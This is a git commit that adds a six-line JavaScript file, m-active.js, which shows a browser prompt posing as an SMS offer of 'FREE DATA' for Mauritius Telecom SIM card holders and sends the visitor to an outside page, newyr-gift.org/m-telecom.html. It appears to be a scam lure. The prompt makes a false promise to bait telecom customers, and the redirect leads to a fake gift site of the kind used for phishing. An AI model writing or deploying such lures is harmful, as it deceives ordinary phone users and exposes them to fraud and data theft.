c252e14890b49c2e95bcfaa822b6dbf7166d5f2a
ukebeblog <esther001imoh@gmail.com>
2025-03-04 06:05:55 +0100

    Create m-active.js

---
+++ m-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE FREE DATA'
+password=prompt('SMS! Get FREE DATA if your Mauritius Telecom Sim Card is up to 6 months or above, Kindly Press OK to CHECK now   ','ACTIVATE FREE DATA');
+if (password != 'ACTIVATE FREE DATA') {
+location.href='https://newyr-gift.org/m-telecom.html';
+}
